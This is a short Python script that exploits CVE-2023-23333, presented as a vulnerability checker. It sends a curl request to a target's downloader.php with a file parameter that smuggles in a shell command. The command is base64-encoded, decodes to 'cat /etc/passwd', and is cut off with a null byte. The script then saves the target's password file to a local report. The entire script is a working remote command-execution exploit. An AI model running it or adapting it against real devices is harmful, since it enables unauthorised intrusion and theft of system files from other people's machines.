import subprocess

# Prompt ip address
ip_address = input("Enter the IP address & Port of the device: (Ex: 10.10.10.10:82)\n")

# Craft command
command = 'curl "http://{}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip" | grep "root:.*:0:0"'.format(ip_address)

# Execute command 
output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL)

# Decode 
output = output_bytes.decode("utf-8-sig", errors='replace')

# Check
if 'root' in output:
    print("The IP address {} is vulnerable to CVE-2023-23333.".format(ip_address))
    print("Output:")
    print(output)

    # Write full report
    full_output_command = 'curl "http://{}/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg%3D%3D|base64%20-d|bash%00.zip"'.format(ip_address)
    full_output_bytes = subprocess.check_output(full_output_command, shell=True, stderr=subprocess.DEVNULL)
    full_output = full_output_bytes.decode("utf-8-sig", errors='replace')
    with open("full-output.txt", "w") as file:
        file.write(full_output)
        print("The full output has been saved to 'full-output.txt'.")

else:
    print("The IP address {} is not vulnerable to CVE-2023-23333.".format(ip_address))



